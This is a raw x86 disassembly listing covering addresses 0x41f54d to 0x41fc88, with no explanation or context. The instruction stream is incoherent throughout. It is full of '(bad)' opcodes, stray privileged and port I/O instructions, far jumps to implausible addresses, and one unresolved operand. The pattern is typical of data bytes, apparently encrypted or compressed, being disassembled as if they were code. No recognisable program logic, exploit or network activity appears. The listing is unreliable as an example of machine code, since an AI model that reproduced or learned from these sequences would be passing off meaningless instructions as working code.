  41f54d:	fiadd  DWORD PTR [ebp-0x77]
  41f550:	(bad)  
  41f551:	(bad)  
  41f552:	fcmove st,st(2)
  41f554:	dec    ecx
  41f555:	ds out dx,al
  41f557:	lea    ecx,[eax+eax*1]
  41f55a:	imul   esi,DWORD PTR [edx+ecx*2+0x43fcceb0],0xb04b3617
  41f565:	jmp    0xd039:0x6b2109d0
  41f56c:	jg     0x41f4f3
  41f56e:	das    
  41f56f:	sub    BYTE PTR [esi+0x3e],ch
  41f572:	int3   
  41f573:	cmp    eax,eax
  41f575:	inc    ebp
  41f576:	ins    DWORD PTR es:[edi],dx
  41f577:	mov    ds:0x716743f1,eax
  41f57c:	xor    al,0xce
  41f57e:	dec    dx
  41f580:	and    eax,0x9b4e189
  41f585:	xchg   ebp,eax
  41f586:	push   es
  41f587:	ins    BYTE PTR es:[edi],dx
  41f588:	loope  0x41f5ca
  41f58a:	and    edi,DWORD PTR [edx]
  41f58c:	push   edi
  41f58d:	aas    
  41f58e:	icebp  
  41f58f:	lods   al,BYTE PTR ds:[esi]
  41f590:	pushf  
  41f591:	iret   
  41f592:	into   
  41f593:	pop    ecx
  41f594:	call   0x7cd9fb5e
  41f599:	xor    BYTE PTR [edi+ecx*4+0x5a761d5b],bh
  41f5a0:	ss xor al,cl
  41f5a3:	(bad)  
  41f5a4:	scas   al,BYTE PTR es:[edi]
  41f5a5:	add    DWORD PTR [edi-0x4d],ecx
  41f5a8:	scas   eax,DWORD PTR es:[edi]
  41f5a9:	jg     0x41f537
  41f5ab:	fdivr  QWORD PTR [esi-0x64]
  41f5ae:	std    
  41f5af:	or     BYTE PTR [eax-0x7eb82238],al
  41f5b5:	fstp   QWORD PTR [edi-0x161a4bfc]
  41f5bb:	sub    DWORD PTR [ebx-0x377e254c],edi
  41f5c1:	mov    cl,BYTE PTR [ebp+0xc774269]
  41f5c7:	or     BYTE PTR [eax-0x2c],bh
  41f5ca:	dec    edx
  41f5cb:	xchg   ebp,eax
  41f5cc:	and    BYTE PTR [esi],bl
  41f5ce:	pushf  
  41f5cf:	lods   eax,DWORD PTR ds:[esi]
  41f5d0:	sbb    esp,DWORD PTR [ecx]
  41f5d2:	push   edi
  41f5d3:	hlt    
  41f5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5d5:	dec    ecx
  41f5d6:	push   cs
  41f5d7:	mov    bh,0x45
  41f5d9:	push   es
  41f5da:	les    edi,FWORD PTR [edi+eiz*2+0x16]
  41f5de:	pop    es
  41f5df:	and    BYTE PTR [edx+0x55770d2],bh
  41f5e5:	fwait
  41f5e6:	lods   al,BYTE PTR ds:[esi]
  41f5e7:	xchg   edi,eax
  41f5e8:	pop    es
  41f5e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5ea:	lods   eax,DWORD PTR ds:[esi]
  41f5eb:	das    
  41f5ec:	inc    edx
  41f5ed:	fist   DWORD PTR [esi]
  41f5ef:	jecxz  0x41f667
  41f5f1:	jae    0x41f607
  41f5f3:	xchg   ebx,eax
  41f5f4:	fs pop eax
  41f5f6:	jge    0x41f5f4
  41f5f8:	adc    al,0x3e
  41f5fa:	repz jns 0x41f63b
  41f5fd:	or     eax,0x7a884744
  41f602:	gs (bad) 
  41f604:	dec    BYTE PTR [ebx-0x1f38cf0a]
  41f60a:	mov    esi,0xd1d745de
  41f60f:	dec    eax
  41f610:	xor    DWORD PTR [ebp+ecx*2+0x15],esi
  41f614:	mov    al,ds:0x812ceebf
  41f619:	sbb    esi,DWORD PTR [edi+0x6900a9d1]
  41f61f:	data16 mov ch,BYTE PTR [ecx-0x42]
  41f623:	cmp    ebp,ebp
  41f625:	test   BYTE PTR [edi+0x69],al
  41f628:	lods   al,BYTE PTR ss:[esi]
  41f62a:	ds call 0x160df832
  41f630:	mov    es,WORD PTR [edi+0x18]
  41f633:	jae    0x41f602
  41f635:	xchg   edi,eax
  41f636:	lock sti 
  41f638:	adc    eax,0x5c47a0ad
  41f63d:	mov    ds:0xae90cb23,al
  41f642:	fstp   TBYTE PTR [ebx-0x3f]
  41f645:	sbb    ch,BYTE PTR ds:0x32657d3e
  41f64b:	xor    dl,BYTE PTR [esi+edx*8]
  41f64e:	jl     0x41f689
  41f650:	dec    edx
  41f651:	push   es
  41f652:	xchg   bh,bl
  41f654:	sub    al,0x74
  41f656:	mov    esp,esp
  41f658:	dec    edx
  41f659:	sub    ebp,DWORD PTR [edx-0x2a]
  41f65c:	int    0x22
  41f65e:	jne    0x41f622
  41f660:	mov    ds:0x3dbb354,eax
  41f665:	lods   eax,DWORD PTR ds:[esi]
  41f666:	les    ebx,FWORD PTR [esi]
  41f668:	es repnz in al,dx
  41f66b:	xor    BYTE PTR [eax+0x5dd76781],dl
  41f671:	outs   dx,BYTE PTR ds:[esi]
  41f672:	or     BYTE PTR [ebx+eiz*2-0x2e05d3cb],0xd3
  41f67a:	jne    0x41f65b
  41f67c:	call   0xe961:0xb365699e
  41f683:	ja     0x41f617
  41f685:	xlat   BYTE PTR ds:[ebx]
  41f686:	mov    esp,0x70a20f34
  41f68b:	retf   0x951b
  41f68e:	mov    dl,0x8b
  41f690:	push   ecx
  41f691:	ret    
  41f692:	sbb    edx,ebp
  41f694:	popf   
  41f695:	int3   
  41f696:	addr16 mov al,0x55
  41f699:	xchg   edi,eax
  41f69a:	fistp  WORD PTR [esi-0x2a437235]
  41f6a0:	mov    BYTE PTR [edi-0x552ae814],bl
  41f6a6:	add    al,0xab
  41f6a8:	cmp    al,bh
  41f6aa:	cmp    edx,DWORD PTR [ebx]
  41f6ac:	in     eax,dx
  41f6ad:	repnz add ebp,DWORD PTR cs:[ebp+0x50]
  41f6b2:	test   al,0x8b
  41f6b4:	inc    ecx
  41f6b5:	lea    ebx,[ebx-0x2d433b48]
  41f6bb:	(bad)  
  41f6bc:	(bad)  
  41f6be:	pop    es
  41f6bf:	push   edx
  41f6c0:	mov    ds:0x6187694a,al
  41f6c5:	shl    BYTE PTR [edx-0x5c980eac],1
  41f6cb:	dec    esi
  41f6cc:	push   ss
  41f6cd:	sbb    DWORD PTR [di],edx
  41f6d0:	add    bh,BYTE PTR [ebx]
  41f6d2:	xor    edi,ebx
  41f6d4:	and    cl,0x2e
  41f6d7:	fsubr  DWORD PTR [edx-0x11cd6c20]
  41f6dd:	ja     0x41f698
  41f6df:	pop    ebx
  41f6e0:	scas   eax,DWORD PTR es:[edi]
  41f6e1:	dec    esi
  41f6e2:	imul   edi,DWORD PTR [eiz*8-0x419a72f5],0xfffffffb
  41f6ea:	daa    
  41f6eb:	js     0x41f686
  41f6ed:	test   DWORD PTR [ecx],edi
  41f6ef:	push   cs
  41f6f0:	vpmaxsw ymm5,ymm1,YMMWORD PTR [ecx+edx*4-0x517d90f9]
  41f6f9:	pop    ss
  41f6fa:	adc    dh,BYTE PTR [edi+0x5e]
  41f6fd:	in     eax,0x52
  41f6ff:	loop   0x41f6d2
  41f701:	add    al,0x1b
  41f703:	daa    
  41f704:	cld    
  41f705:	xchg   edi,eax
  41f706:	pushf  
  41f707:	in     eax,dx
  41f708:	cmp    edx,0xffffff80
  41f70b:	or     DWORD PTR [eax],0x5e4d3cca
  41f711:	fnstcw WORD PTR [ebp-0x18]
  41f714:	pop    esp
  41f715:	ss iret 
  41f717:	push   eax
  41f718:	test   BYTE PTR [ebx],bl
  41f71a:	leave  
  41f71b:	push   eax
  41f71c:	sub    eax,0x1991d830
  41f721:	jecxz  0x41f6b4
  41f723:	xor    al,0xbe
  41f725:	xchg   ebp,eax
  41f726:	or     BYTE PTR [ebx-0x24fe7652],dl
  41f72c:	jle    0x41f793
  41f72e:	push   es
  41f72f:	sbb    eax,0x57dd5b20
  41f734:	push   ss
  41f735:	lea    eax,[edi-0x6f9eee24]
  41f73b:	mov    ecx,0x2478dbd
  41f740:	pusha  
  41f741:	add    BYTE PTR [esi+0x2252fb3f],ah
  41f747:	adc    al,0x12
  41f749:	inc    ecx
  41f74a:	push   cs
  41f74b:	cmc    
  41f74c:	les    edi,FWORD PTR [edi*2+0xe47a952]
  41f753:	js     0x41f73f
  41f755:	dec    DWORD PTR [eax-0x1c47a413]
  41f75b:	clc    
  41f75c:	xchg   BYTE PTR [edi],bh
  41f75e:	aas    
  41f75f:	add    BYTE PTR [edi+0x71],bl
  41f762:	push   edi
  41f763:	push   ebx
  41f764:	sub    ch,ch
  41f766:	dec    ecx
  41f767:	daa    
  41f768:	push   edi
  41f769:	xor    al,0x96
  41f76b:	stos   DWORD PTR es:[edi],eax
  41f76c:	ja     0x41f791
  41f76e:	cmc    
  41f76f:	jb     0x41f785
  41f771:	jge    0x41f7d3
  41f773:	and    bh,BYTE PTR [ecx+0x22]
  41f776:	outs   dx,BYTE PTR ds:[esi]
  41f777:	mov    al,ds:0xcdbed7fc
  41f77c:	pop    ebx
  41f77d:	mov    eax,0xb0ef4bbb
  41f782:	and    ch,BYTE PTR [ecx+0x56a45c74]
  41f788:	retf   
  41f789:	fnsave [edi-0x788fea1c]
  41f78f:	mov    es,WORD PTR [ecx]
  41f791:	retf   0x6b97
  41f794:	outs   dx,DWORD PTR ds:[esi]
  41f795:	sbb    DWORD PTR [ecx-0xe],esi
  41f798:	pop    esp
  41f799:	retf   0xd220
  41f79c:	les    edx,FWORD PTR [eax+0x3457ed1a]
  41f7a2:	mov    DWORD PTR [eax+0x33],ebp
  41f7a5:	int3   
  41f7a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7a7:	aas    
  41f7a8:	(bad)  
  41f7a9:	or     BYTE PTR [esi-0x50],0x74
  41f7ad:	xor    DWORD PTR [edx-0x534c75c],eax
  41f7b3:	jmp    0xad4f:0x6870f92b
  41f7ba:	stos   BYTE PTR es:[edi],al
  41f7bb:	loop   0x41f74a
  41f7bd:	fwait
  41f7be:	shr    DWORD PTR ds:0xe196916b,1
  41f7c4:	jmp    0x4ff43abf
  41f7c9:	cld    
  41f7ca:	add    DWORD PTR [esi-0x2384966b],0xffffffb9
  41f7d1:	xchg   edi,eax
  41f7d2:	aam    0x70
  41f7d4:	mov    eax,ds:0xfda1486d
  41f7d9:	cli    
  41f7da:	rol    edx,cl
  41f7dc:	inc    ebp
  41f7dd:	sub    ch,BYTE PTR [edi]
  41f7df:	mov    esp,0xa33caffd
  41f7e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e5:	or     al,0xae
  41f7e7:	xor    edx,0xc89b8d45
  41f7ed:	push   edx
  41f7ee:	jecxz  0x41f77f
  41f7f0:	(bad)  
  41f7f2:	std    
  41f7f3:	sub    ecx,0x82d1fc2e
  41f7f9:	jg     0x41f7ca
  41f7fb:	or     al,0x24
  41f7fd:	vandpd ymm7,ymm2,YMMWORD PTR gs:[ebp-0x25]
  41f803:	ins    DWORD PTR es:[edi],dx
  41f804:	fdiv   st,st(4)
  41f806:	bound  esp,QWORD PTR [ebx]
  41f808:	fst    DWORD PTR [esi+0x1a179475]
  41f80e:	and    al,0x3b
  41f810:	imul   esp,DWORD PTR [edx+0x6a56e147],0x8c0fa8d9
  41f81a:	test   eax,0x86d92095
  41f81f:	cld    
  41f820:	fld    QWORD PTR [eax-0x76c1976e]
  41f826:	cs icebp 
  41f828:	xchg   ebx,eax
  41f829:	rcr    BYTE PTR [eax+0x133588cc],0x6
  41f830:	mov    edx,0x3528f5a0
  41f835:	pop    edx
  41f836:	push   ebx
  41f837:	jle    0x41f84b
  41f839:	inc    edi
  41f83a:	xchg   ebp,eax
  41f83b:	mov    ebx,0x2fd90c01
  41f840:	add    al,BYTE PTR [edi+esi*2]
  41f843:	in     al,dx
  41f844:	in     eax,0xfc
  41f846:	out    dx,eax
  41f847:	mov    BYTE PTR [eax],cl
  41f849:	pop    ecx
  41f84a:	pop    ebx
  41f84b:	bound  esp,QWORD PTR [ebx+0x55f7a4bf]
  41f851:	xor    al,0xe2
  41f853:	mov    bh,0x27
  41f855:	stc    
  41f856:	adc    dl,bh
  41f858:	jl     0x41f8bb
  41f85a:	inc    esp
  41f85b:	stos   DWORD PTR es:[edi],eax
  41f85c:	or     bh,BYTE PTR [edi-0x7b]
  41f85f:	lea    ecx,[eax-0x71]
  41f862:	into   
  41f863:	test   cl,bh
  41f865:	xor    DWORD PTR [edi],ecx
  41f867:	cmp    ecx,DWORD PTR ds:0x3d70f36f
  41f86d:	xchg   ebx,eax
  41f86e:	in     al,0xaf
  41f870:	mov    esp,0x335406ab
  41f875:	retf   0xcb7d
  41f878:	dec    ebp
  41f879:	ret    
  41f87a:	mov    edi,0x70ef2ecd
  41f87f:	fidivr WORD PTR [ebx]
  41f881:	mov    eax,0x3963fb97
  41f886:	lea    edi,[edx]
  41f888:	shl    esi,1
  41f88a:	mov    eax,ds:0x37be06dd
  41f88f:	aam    0xb2
  41f891:	pushf  
  41f892:	fwait
  41f893:	fwait
  41f894:	std    
  41f895:	lods   al,BYTE PTR ds:[esi]
  41f896:	and    BYTE PTR [ecx],0x78
  41f899:	sti    
  41f89a:	dec    esp
  41f89b:	arpl   bx,di
  41f89d:	cli    
  41f89e:	xchg   edx,eax
  41f89f:	arpl   WORD PTR [ebx-0x7f],cx
  41f8a2:	pop    eax
  41f8a3:	sbb    BYTE PTR [esi],bh
  41f8a5:	jl     0x41f8d6
  41f8a7:	je     0x41f84a
  41f8a9:	in     al,0x88
  41f8ab:	dec    esp
  41f8ac:	(bad)  
  41f8ad:	push   ss
  41f8ae:	mov    al,0xde
  41f8b0:	outs   dx,BYTE PTR ds:[esi]
  41f8b1:	jno    0x41f83b
  41f8b3:	sub    edi,DWORD PTR [eax+0x43]
  41f8b6:	add    al,0x97
  41f8b8:	and    BYTE PTR [eax-0x2e],bl
  41f8bb:	or     eax,0x96bbab8a
  41f8c0:	lods   al,BYTE PTR ds:[esi]
  41f8c1:	dec    edx
  41f8c2:	mov    esp,0x45cd2faf
  41f8c7:	lahf   
  41f8c8:	xor    BYTE PTR [edx],ah
  41f8ca:	and    al,0x44
  41f8cc:	ss pop ss
  41f8ce:	out    dx,al
  41f8cf:	out    0x14,al
  41f8d1:	xchg   ecx,eax
  41f8d2:	push   0xfde3a05e
  41f8d7:	push   eax
  41f8d8:	mov    ch,0x1d
  41f8da:	xchg   esi,eax
  41f8db:	repz pop esi
  41f8dd:	adc    ah,BYTE PTR [eax-0x342ed0e6]
  41f8e3:	add    dl,BYTE PTR [ecx+0x44f4abd6]
  41f8e9:	mov    dh,0x21
  41f8eb:	sub    eax,0xc7b8f05f
  41f8f0:	add    al,0x7a
  41f8f2:	leave  
  41f8f3:	fsubr  DWORD PTR [ebp+0x53ca39fd]
  41f8f9:	mov    ebp,0xcd355953
  41f8fe:	add    eax,0xa2d1f237
  41f903:	fisub  WORD PTR [ebx]
  41f905:	ds aam 0xa0
  41f908:	push   ss
  41f909:	and    ecx,DWORD PTR [eax]
  41f90b:	mov    ds:0xd54676b4,eax
  41f910:	std    
  41f911:	mov    es,WORD PTR [ecx]
  41f913:	sub    eax,0xba237ec4
  41f918:	xchg   DWORD PTR [ecx],ebx
  41f91a:	pop    edi
  41f91b:	cmp    DWORD PTR [esi],0x1ea1f5d4
  41f921:	out    0x4a,al
  41f923:	lea    esp,[eax]
  41f925:	retf   
  41f926:	mov    dl,0xe9
  41f928:	xchg   edi,eax
  41f929:	je     0x41f8b7
  41f92b:	(bad)  
  41f92c:	jns    0x41f973
  41f92e:	ja     0x41f8ea
  41f930:	and    ebp,esi
  41f932:	dec    ebx
  41f933:	xchg   edi,eax
  41f934:	mov    ds:0xdcbcaa47,eax
  41f939:	add    ebx,eax
  41f93b:	test   DWORD PTR [edi-0x29],eax
  41f93e:	cmp    BYTE PTR [ebx+0x6b4e53e4],0x92
  41f945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f946:	jbe    0x41f96c
  41f948:	in     al,0xfd
  41f94a:	add    DWORD PTR [edi],0xfffffff0
  41f94d:	xchg   edx,eax
  41f94e:	mov    ebp,0x1836b1f
  41f953:	lods   al,BYTE PTR ds:[esi]
  41f954:	sub    ah,bh
  41f956:	stc    
  41f957:	push   ecx
  41f958:	xchg   ebx,eax
  41f959:	mov    esi,gs
  41f95b:	mov    ch,0xaf
  41f95d:	es xchg esp,eax
  41f95f:	nop
  41f960:	adc    BYTE PTR [eax+0x30f2af4d],ch
  41f966:	pop    eax
  41f967:	shl    DWORD PTR [ebx+eax*8+0x1ecf78fc],0x7d
  41f96f:	(bad)
  41f972:	jno    0x41f91e
  41f974:	push   ecx
  41f975:	sbb    al,0xa6
  41f977:	rol    dl,1
  41f979:	in     al,dx
  41f97a:	cmp    ebx,edi
  41f97c:	icebp  
  41f97d:	sub    bh,dl
  41f97f:	(bad)  
  41f980:	fidivr WORD PTR [eax-0x19]
  41f983:	pop    ebx
  41f984:	xor    cl,BYTE PTR [edi]
  41f986:	imul   ebx,DWORD PTR [edx],0xffffffba
  41f989:	xchg   edx,eax
  41f98a:	cmp    eax,DWORD PTR [edi]
  41f98c:	xchg   BYTE PTR [edi-0x7e25dbf8],bl
  41f992:	sub    BYTE PTR [ecx+0x48],ch
  41f995:	lods   al,BYTE PTR ds:[esi]
  41f996:	dec    esp
  41f997:	add    al,BYTE PTR [edi]
  41f999:	(bad)  
  41f99b:	sbb    edi,DWORD PTR [edx-0x7016b5fc]
  41f9a1:	sbb    DWORD PTR [esp+eax*1+0x5d],esp
  41f9a5:	mov    edx,0xacdd47d6
  41f9aa:	outs   dx,BYTE PTR ds:[esi]
  41f9ab:	pop    ebx
  41f9ac:	dec    esi
  41f9ad:	add    al,0x1e
  41f9af:	scas   eax,DWORD PTR es:[edi]
  41f9b0:	sub    eax,0x5b023594
  41f9b5:	mov    WORD PTR [edx-0x5],?
  41f9b8:	fcom   st(2)
  41f9ba:	in     eax,0xb5
  41f9bc:	loope  0x41fa28
  41f9be:	or     dh,BYTE PTR [edi-0x74]
  41f9c1:	pusha  
  41f9c2:	nop/reserved BYTE PTR [ebx-0x20b37dab]
  41f9c9:	push   edx
  41f9ca:	sahf   
  41f9cb:	xor    edi,DWORD PTR [eax+0x391db489]
  41f9d1:	sti    
  41f9d2:	xchg   BYTE PTR [ebx+0x6ee1e750],bl
  41f9d8:	xor    DWORD PTR [ecx],0x5d
  41f9db:	sbb    DWORD PTR [esi-0x3a],esi
  41f9de:	pop    es
  41f9df:	xchg   DWORD PTR [edx-0x6e],edx
  41f9e2:	jb     0x41f9b0
  41f9e4:	mov    esi,0x919bc9bf
  41f9e9:	lods   eax,DWORD PTR ds:[esi]
  41f9ea:	ficom  DWORD PTR [esi]
  41f9ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9ed:	scas   al,BYTE PTR es:[edi]
  41f9ee:	adc    al,0xdc
  41f9f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9f1:	aad    0x42
  41f9f3:	stc    
  41f9f4:	xor    al,BYTE PTR [ecx]
  41f9f6:	pop    ecx
  41f9f7:	xlat   BYTE PTR ds:[ebx]
  41f9f8:	pop    ebp
  41f9f9:	adc    al,BYTE PTR [eax-0x3]
  41f9fc:	jecxz  0x41fa25
  41f9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9ff:	inc    edi
  41fa00:	aad    0xe7
  41fa02:	out    dx,al
  41fa03:	pop    ecx
  41fa04:	mov    ecx,0x464f0d4e
  41fa09:	cli    
  41fa0a:	cld    
  41fa0b:	add    ecx,ecx
  41fa0d:	cmp    eax,0xe39e5c8c
  41fa12:	fdivr  QWORD PTR [esi-0x15172bdc]
  41fa18:	push   ecx
  41fa19:	lods   al,BYTE PTR ds:[esi]
  41fa1a:	mov    BYTE PTR [eax],ah
  41fa1c:	push   ecx
  41fa1d:	mov    ds:0x5a46dccb,eax
  41fa22:	lds    ecx,FWORD PTR [ecx]
  41fa24:	pop    edx
  41fa25:	or     BYTE PTR [ecx-0x114aa139],cl
  41fa2b:	int    0x60
  41fa2d:	inc    ebx
  41fa2e:	sub    eax,0xfbe26ea9
  41fa33:	in     al,dx
  41fa34:	adc    DWORD PTR [ebx+0x70147ed],edx
  41fa3a:	jle    0x41fa75
  41fa3c:	or     dh,BYTE PTR [edi-0x5f]
  41fa3f:	and    eax,0x53e7d411
  41fa44:	sub    eax,DWORD PTR [ebx+0xbd5164b]
  41fa4a:	push   esp
  41fa4b:	out    0x3f,al
  41fa4d:	and    al,0xf4
  41fa4f:	jns    0x41facd
  41fa51:	test   al,0x15
  41fa53:	mov    dh,0xef
  41fa55:	int    0x48
  41fa57:	lea    ebx,[esp+ebp*8+0x4b73686e]
  41fa5e:	out    0x7c,eax
  41fa60:	out    0x3d,eax
  41fa62:	ret    0x5e66
  41fa65:	mov    esi,0x985c591b
  41fa6a:	xchg   edi,eax
  41fa6b:	add    al,0x3d
  41fa6d:	out    0xad,eax
  41fa6f:	popa   
  41fa70:	sub    al,0x4e
  41fa72:	xchg   ecx,eax
  41fa73:	fidiv  DWORD PTR [edx]
  41fa75:	xchg   ebp,eax
  41fa76:	sbb    BYTE PTR cs:[esi],dh
  41fa79:	jge    0x41fa76
  41fa7b:	and    al,0xff
  41fa7d:	push   ebx
  41fa7e:	pop    edx
  41fa7f:	imul   eax,DWORD PTR [esi+0x7d],0x3190615c
  41fa86:	je     0x41fa7e
  41fa88:	jne    0x41fa5a
  41fa8a:	xor    dh,BYTE PTR [ebx+0x200d14]
  41fa90:	jle    0x41fa36
  41fa92:	sbb    al,0x3a
  41fa94:	push   ds
  41fa95:	xchg   edi,eax
  41fa96:	icebp  
  41fa97:	jge    0x41fa4b
  41fa99:	push   ebx
  41fa9a:	sbb    edi,DWORD PTR ds:0x89345273
  41faa0:	push   ds
  41faa1:	fbstp  TBYTE PTR [esi+0x44]
  41faa4:	out    0x68,eax
  41faa6:	sub    eax,0xf950741f
  41faab:	jo     0x41fa41
  41faad:	or     DWORD PTR [edi-0x4d],esp
  41fab0:	out    dx,eax
  41fab1:	lods   al,BYTE PTR ds:[esi]
  41fab2:	test   BYTE PTR [ecx],bh
  41fab4:	inc    esi
  41fab5:	jecxz  0x41fa9e
  41fab7:	add    DWORD PTR [ecx+0x376c2a4e],edi
  41fabd:	mov    DWORD PTR [ebx-0x66],ebx
  41fac0:	cli    
  41fac1:	pop    esp
  41fac2:	call   0x7ada:0xeb23959b
  41fac9:	retf   0x9718
  41facc:	imul   ebp,DWORD PTR [ebx+0x3c0085b8],0x4abd37cb
  41fad6:	lods   eax,DWORD PTR ds:[esi]
  41fad7:	(bad)  
  41fad8:	push   ebx
  41fad9:	retf   0x2213
  41fadc:	(bad)
  41fadf:	test   eax,0x57eb4cb9
  41fae4:	out    0xdb,eax
  41fae6:	dec    esi
  41fae7:	popf   
  41fae8:	push   ss
  41fae9:	adc    bh,BYTE PTR [ecx+0x566d0e6e]
  41faef:	lock jne 0x41fb11
  41faf2:	scas   eax,DWORD PTR es:[edi]
  41faf3:	xchg   ebp,eax
  41faf4:	mov    esp,0x87313727
  41faf9:	xor    esi,DWORD PTR [ecx+0x27]
  41fafc:	add    BYTE PTR [esi],dl
  41fafe:	mov    esi,0xbcde7e32
  41fb03:	aam    0xd5
  41fb05:	pop    ecx
  41fb06:	fdiv   QWORD PTR [eax]
  41fb08:	push   es
  41fb09:	jmp    0xfb41074a
  41fb0e:	(bad)  
  41fb0f:	sbb    DWORD PTR [ecx],ecx
  41fb11:	push   ecx
  41fb12:	dec    eax
  41fb13:	mov    esi,0xff0c02e2
  41fb18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb19:	aad    0x2b
  41fb1b:	lods   al,BYTE PTR es:[esi]
  41fb1d:	mov    esi,esi
  41fb1f:	mov    ecx,0x4feb367a
  41fb24:	stos   BYTE PTR es:[edi],al
  41fb25:	cld    
  41fb26:	in     al,dx
  41fb27:	and    DWORD PTR ds:0xd1961e8c,ecx
  41fb2d:	or     DWORD PTR [ecx+0xa],ecx
  41fb30:	addr16 in eax,0x68
  41fb33:	retf   
  41fb34:	cli    
  41fb35:	mov    cl,0xc6
  41fb37:	outs   dx,DWORD PTR ds:[esi]
  41fb38:	es loope 0x41fb5d
  41fb3b:	or     eax,0xe774b2ba
  41fb40:	(bad)  
  41fb41:	xchg   edx,eax
  41fb42:	sub    eax,0x36f609a2
  41fb47:	jb     0x41fba6
  41fb49:	repnz dec ebp
  41fb4b:	and    cl,BYTE PTR [ebx+0x168bb233]
  41fb51:	stos   DWORD PTR es:[edi],eax
  41fb52:	mov    dh,BYTE PTR [edx+0x5b]
  41fb55:	dec    edi
  41fb56:	mov    esp,0xab9bda8c
  41fb5b:	add    DWORD PTR [ebx],edi
  41fb5d:	scas   al,BYTE PTR es:[edi]
  41fb5e:	mov    cl,0x81
  41fb60:	out    dx,al
  41fb61:	jle    0x41fae3
  41fb63:	imul   esp,DWORD PTR [edx],0x774b8989
  41fb69:	clc    
  41fb6a:	stos   BYTE PTR es:[edi],al
  41fb6b:	repnz (bad) 
  41fb6d:	dec    edi
  41fb6e:	add    al,0x6c
  41fb70:	retf   0x1844
  41fb73:	mov    ecx,0xf8ab6b21
  41fb78:	dec    eax
  41fb79:	cmp    dl,BYTE PTR [edx-0x4f5ec893]
  41fb7f:	loope  0x41fba1
  41fb81:	xor    ebp,esi
  41fb83:	jno    0x41fb40
  41fb85:	xchg   DWORD PTR [ebp+0x32f8a86a],edi
  41fb8b:	xchg   esi,esi
  41fb8d:	gs jmp 0x37b16abd
  41fb93:	mov    ecx,DWORD PTR [edx+0x6ff6e9b2]
  41fb99:	les    edx,FWORD PTR [eax-0x89ac2c5]
  41fb9f:	push   0xd075dcb
  41fba4:	ds aad 0x59
  41fba7:	push   es
  41fba8:	sub    eax,0x4c597ca
  41fbad:	or     cl,BYTE PTR [esi-0x20]
  41fbb0:	sbb    edi,DWORD PTR [edi-0x7e74e21b]
  41fbb6:	bnd jg 0x41fbd6
  41fbb9:	dec    edi
  41fbba:	sub    BYTE PTR [edi-0x5805ad96],dh
  41fbc0:	(bad)  
  41fbc1:	mov    edi,0xb8d98df0
  41fbc6:	ror    BYTE PTR [edi-0x2b],0x7b
  41fbca:	sub    bl,ch
  41fbcc:	cs add edx,0x5c
  41fbd0:	xchg   esp,eax
  41fbd1:	in     al,dx
  41fbd2:	inc    ecx
  41fbd3:	jae    0x41fbe2
  41fbd5:	pop    cx
  41fbd7:	pop    esi
  41fbd8:	pop    edi
  41fbd9:	stos   DWORD PTR es:[edi],eax
  41fbda:	dec    ebp
  41fbdb:	leave  
  41fbdc:	das    
  41fbdd:	outs   dx,DWORD PTR ds:[esi]
  41fbde:	adc    bl,cl
  41fbe0:	or     BYTE PTR [eax],al
  41fbe2:	cdq    
  41fbe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbe4:	test   ax,0x50d5
  41fbe8:	and    eax,0x318f5e54
  41fbed:	jge    0x41fc53
  41fbef:	ss cmc 
  41fbf1:	(bad)  
  41fbf2:	pop    ebx
  41fbf3:	push   edx
  41fbf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbf5:	test   ah,bl
  41fbf7:	jnp    0x41fc53
  41fbf9:	test   DWORD PTR [edi+0x6f1df713],ebx
  41fbff:	sbb    dh,dl
  41fc01:	test   BYTE PTR [edi-0x250a581d],bh
  41fc07:	adc    bh,BYTE PTR [ecx]
  41fc09:	imul   eax,ecx,0x4
  41fc0c:	imul   edx,DWORD PTR [edi+0x48dd6c4a],0x427bebd3
  41fc16:	xchg   edi,eax
  41fc17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc18:	lock xor BYTE PTR [edx],cl
  41fc1b:	jb     0x41fc16
  41fc1d:	repnz pop ecx
  41fc1f:	adc    eax,0x3fb9be00
  41fc24:	inc    esp
  41fc25:	pusha  
  41fc26:	dec    ebx
  41fc27:	adc    al,0xdb
  41fc29:	add    al,0xe4
  41fc2b:	cmp    ecx,DWORD PTR [eax-0x32bb2444]
  41fc31:	xor    esi,DWORD PTR [eax]
  41fc33:	shl    BYTE PTR [ebp+0x6ebbd2c2],0x27
  41fc3a:	xchg   ebx,eax
  41fc3b:	mov    ah,0xe2
  41fc3d:	dec    ebx
  41fc3e:	mov    ds:0xead1fe0d,al
  41fc43:	xchg   ebp,eax
  41fc44:	lods   eax,DWORD PTR ds:[esi]
  41fc45:	pop    ebp
  41fc46:	inc    edx
  41fc47:	mov    BYTE PTR [esi],ah
  41fc49:	and    BYTE PTR [eax+0x5f],dh
  41fc4c:	cwde   
  41fc4d:	jns    0x41fc8d
  41fc4f:	jl     0x41fcbc
  41fc51:	pop    ss
  41fc52:	cdq    
  41fc53:	or     BYTE PTR [ebp-0x6d],dh
  41fc56:	jns    0x41fca3
  41fc58:	jns    0x41fc11
  41fc5a:	jbe    0x41fcb5
  41fc5c:	test   DWORD PTR [edi],ecx
  41fc5e:	xchg   esi,eax
  41fc5f:	jmp    0xf07f91e8
  41fc64:	mov    DWORD PTR ds:0x3ed5bcac,0xec9d17f7
  41fc6e:	pop    esp
  41fc6f:	ins    DWORD PTR es:[edi],dx
  41fc70:	inc    edx
  41fc71:	mov    WORD PTR [esi],es
  41fc73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc74:	scas   al,BYTE PTR es:[edi]
  41fc75:	pop    ebp
  41fc76:	data16 int 0xd8
  41fc79:	(bad)  
  41fc7a:	out    dx,al
  41fc7b:	push   ss
  41fc7c:	cwde   
  41fc7d:	mov    es,WORD PTR [edi]
  41fc7f:	xor    eax,DWORD PTR [esi]
  41fc81:	jmp    edi
  41fc83:	cs shl cl,cl
  41fc86:	repz popf 
  41fc88:	pop    ss
